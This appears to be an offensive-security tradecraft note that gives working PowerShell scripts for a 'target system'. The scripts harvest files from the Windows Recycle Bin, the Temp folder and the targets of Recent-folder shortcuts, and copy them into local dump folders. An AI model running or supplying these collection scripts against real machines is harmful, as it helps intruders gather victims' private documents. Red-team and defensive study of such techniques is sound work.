# Dumpster Diving

## Target: Recycle Bin

We might suspect that there is sensitive information in the target system's **Recycle Bin**. The following PowerShell command is intended for that purpose—it copies all files found in the Recycle.Bin to a specified folder. It leverages COM objects.

```powershell
# Set the output folder path to save files
$destDir = "$env:USERPROFILE\Desktop\RecycleDump"
if (-not (Test-Path $destDir)) {
    New-Item -ItemType Directory -Path $destDir | Out-Null
}

# Enumerate files under Recycle.Bin and copy them to the $destDir.
$shell = New-Object -ComObject Shell.Application
$recycleBin = $shell.NameSpace('shell:::{645FF040-5081-101B-9F08-00AA002F954E}')
$recycleBin.Items() | ForEach-Object {
    $sourcePath = $_.Path
    $fileName = $_.Name
    $destPath = Join-Path $destDir $fileName

    if (Test-Path $sourcePath) {
        try {
            Copy-Item -Path $sourcePath -Destination $destPath -Force
        } catch {}
    }
}
```

## Target: Temp Folder

The `Temp` folder can contain files which store sensitive information. The following PowerShell command copies files with specific extensions from the Temp folder to a specified destination folder.

```powershell
# Set the output folder path to save files
$destDir = "$env:USERPROFILE\Desktop\TempDump"
if (-not (Test-Path $destDir)) {
    New-Item -ItemType Directory -Path $destDir | Out-Null
}

# Target file extensions to copy
$targetExtensions = @(".csv", ".docx", ".json", ".log", ".pdf", ".txt", ".xlsx")

# Enumerate temp directory and copy target files
$tempPath = [System.IO.Path]::GetTempPath()
Get-ChildItem -Path $tempPath -Recurse -File -ErrorAction SilentlyContinue | Where-Object {
    $targetExtensions -contains $_.Extension.ToLower() -and
    $_.Length -lt 100MB -and
    $_.LastWriteTime -gt (Get-Date).AddDays(-7)
} | ForEach-Object {
    $destPath = Join-Path $destDir $_.Name
    Copy-Item -Path $_.FullName -Destination $destPath -Force
}
```

## Target: Recent Folder

Sensitive information may also be hidden in the Recent folder. The following PowerShell command copies specific files from the Recent folder to the specified output directory.

```powershell
# Set the output folder path to save files
$destDir = "$env:USERPROFILE\Desktop\RecentDump"
if (-not (Test-Path $destDir)) {
    New-Item -ItemType Directory -Path $destDir | Out-Null
}

# Target file extensions to copy
$targetExtensions = @(".csv", ".docx", ".json", ".log", ".pdf", ".txt", ".xlsx")

# Enumerate the Recent folder and copy target files
$recentPath = "$env:APPDATA\Microsoft\Windows\Recent"
$shell = New-Object -ComObject WScript.Shell
Get-ChildItem -Path $recentPath -Filter *.lnk | ForEach-Object {
    try {
        $shortcut = $shell.CreateShortcut($_.FullName)
        $targetPath = $shortcut.TargetPath

        if (Test-Path $targetPath) {
            $extension = [System.IO.Path]::GetExtension($targetPath).ToLower()
            $size = (Get-Item $targetPath).Length
            # $lastWrite = (Get-Item $targetPath).LastWriteTime

            if (
                $targetExtensions -contains $extension -and
                $size -lt 100MB
            ) {
                $fileName = [System.IO.Path]::GetFileName($targetPath)
                $destPath = Join-Path $destDir $fileName
                Copy-Item -Path $targetPath -Destination $destPath -Force
            }
        }
    } catch {}
}
```